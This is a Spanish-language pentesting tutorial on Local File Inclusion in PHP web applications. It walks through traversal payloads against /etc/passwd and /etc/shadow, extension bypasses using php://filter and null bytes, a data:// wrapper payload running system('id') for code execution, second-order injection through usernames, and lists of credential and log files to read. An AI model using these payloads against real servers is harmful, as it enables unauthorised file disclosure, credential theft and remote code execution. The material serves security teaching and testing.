
Las vulnerabilidades de **Local File Inclusion** permiten que un atacante fuerce al servidor a cargar archivos locales a través de parámetros manipulables. Aunque suele asociarse a PHP, aparece en cualquier tecnología que construya rutas desde datos controlados por usuarios.

Este documento recoge técnicas prácticas, ejemplos reales y bypasses habituales.

---

# **1. Identificación inicial del LFI**

Un primer indicio aparece cuando un parámetro controla qué plantilla, módulo o contenido se carga en la web. Un ejemplo típico:

```
/index.php?template=home.php
```

Si la aplicación usa algo tan simple como:

```php
include($_GET['template']);
```

entonces sustituir `home.php` por un archivo del sistema suele revelar si existe LFI:

### **Ejemplos reales para probar:**

**Linux**

```
?template=/etc/passwd
?template=/proc/self/environ
?template=/etc/issue
```

**Windows**

```
?template=C:\Windows\win.ini
?template=C:\boot.ini
```

Si la aplicación responde con el contenido del fichero, ya sabemos que la inclusión es explotable.

---

# **2. Path Traversal (cuando la aplicación está dentro de un directorio fijo)**

En muchos casos el desarrollador “protege” el include añadiendo una carpeta fija:

```php
include("templates/" . $_GET['template']);
```

Así, un payload absoluto como `/etc/passwd` se convierte en:

```
templates//etc/passwd
```

y falla.  
La técnica general es subir directorios con `../` hasta llegar a raíz y luego avanzar hacia el archivo deseado.

### **Payloads efectivos:**

```
?template=../../../../etc/passwd
?template=../../../../proc/version
?template=../../../../../var/log/auth.log
```

Cuántos `../` necesitas depende de la estructura, pero desde `/` seguir añadiendo más no rompe nada, por lo que se puede abusar:

```
?template=../../../../../../../../etc/passwd
```

---

# **3. Prefijos obligatorios que rompen el payload**

Otro caso habitual es cuando la aplicación antepone un prefijo al nombre del archivo:

```php
include("tpl_" . $_GET['template']);
```

Aquí:

```
?template=../../../etc/passwd
```

se convierte en:

```
tpl_../../../etc/passwd
```

lo cual no existe.

Un bypass común consiste en forzar una ruta absoluta, de forma que el prefijo se interprete como un directorio que no afecta:

```
?template=/../../../etc/passwd
```

Este truco funciona en bastantes entornos, aunque depende del servidor y del sistema de archivos.

---

# **4. Cuando la aplicación añade una extensión automáticamente

Este patrón es extremadamente frecuente:

```php
include($_GET['template'] . ".php");
```

Esto significa que tu payload siempre se transforma en:

```
<lo_que_envías>.php
```

Por ejemplo:

```
?template=/etc/passwd
```

→ carga `/etc/passwd.php` (fichero inexistente).

### **4.1. Técnicas para saltarse esta protección**

---

### **A) Usar wrappers de PHP (muy potente)**

Los wrappers permiten tratar contenido como recursos especiales.

Ejemplos:

#### **1. php://filter para leer código fuente sin ejecutarlo**

```
?template=php://filter/convert.base64-encode/resource=index
```

Como la aplicación añade `.php`, internamente abrirá:

```
php://filter/.../resource=index.php
```

Resultado: el archivo `index.php` se devuelve en **Base64** y basta descodificarlo.

Esto evita restricciones de extensión, y funciona incluso cuando `.php` se añade forzosamente.

---

#### **2. data:// para inyección de contenido**

(útil cuando buscas RCE y no solo lectura)

```
?template=data://text/plain,<?php system('id'); ?>
```

Si el include ejecuta archivos PHP, este payload puede conducir a ejecución remota.  
A menudo es necesario URL-encodearlo:

```
?template=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
```

---

### **B) Null byte (solo versiones antiguas de PHP <= 5.3)**

Hoy menos útil, pero clásico:

```
?template=/etc/passwd%00
```

Lo que hacía era cortar la cadena antes de `.php`, permitiendo incluir cualquier archivo.  
Ya no funciona en versiones modernas, pero a nivel histórico es importante conocerse.

---

### **C) Doble extensión + fallbacks**

Útil cuando la aplicación _busca un archivo PHP válido dentro de directorios_:

```
?template=/var/log/apache2/access.log%00.php
```

o con logs:

```
?template=/var/log/nginx/access.log
```

Cuando el archivo _sí existe_, aunque no sea PHP, intentará incluirlo. A veces lo mostrará como texto (lectura), y otras generará errores que exponen contenido.

---

### **D) Rotura de la extensión mediante rutas absolutas**

Cuando el include hace:

```
include("/app/templates/" . $_GET['template'] . ".php");
```

se puede probar:

```
?template=/etc/passwd%00
```

o incluso:

```
?template=/etc/passwd/
```

Algunos servidores interpretan la barra final como “directorio”, y el `.php` puede quedar ignorado durante la resolución. No es frecuente, pero aparece en configuraciones defectuosas.

---

# **5. Second-Order LFI (ataques indirectos)**

Aquí el parámetro vulnerable **no lo controlas directamente en la URL**, sino que se obtiene de una fuente interna (base de datos, sesión, configuración, etc.).

Ejemplo realista:

1. Te registras con este nombre de usuario:
    
    ```
    ../../../etc/passwd
    ```
    
2. La web guarda ese valor en la base de datos.
    
3. Otra función genera tu avatar:
    
    ```
    /profile/<username>/avatar.png
    ```
    
4. Internamente hace:
    
    ```php
    include("profiles/" . $username . "/avatar.png");
    ```
    
5. Cuando se ejecuta, **incluye `/etc/passwd` en lugar del avatar**.
    

Este tipo de LFI suele pasarse por alto porque el desarrollador “validó” el parámetro directo en la URL, pero no los valores almacenados internamente.

---

# **6. Archivos útiles para leer en un LFI**

Siempre que validas un LFI, intenta leer archivos relevantes que puedan darte más información o permitir escalada.

### **Linux**

- `/etc/passwd`
    
- `/etc/shadow` (si el servidor lo permite)
    
- `/proc/self/environ` → variables de entorno
    
- `/var/www/html/config.php` → credenciales
    
- `/var/log/apache2/access.log` → posible log poisoning
    

### **Windows**

- `C:\Windows\win.ini`
    
- `C:\Windows\System32\drivers\etc\hosts`
    
- `C:\inetpub\wwwroot\web.config`
    

---

# **7. Buenas prácticas de explotación en pentesting**

1. Probar rutas absolutas primero.
    
2. Si falla, pasar a traversal.
    
3. Si hay extensión forzada, escalar a wrappers (`php://filter`).
    
4. Revisar el código resultante para buscar nuevas rutas.
    
5. Buscar puntos donde tu payload pueda almacenarse (second-order).
    
6. No asumir que solo un parámetro tiene LFI: revisa todos los que construyen rutas.
    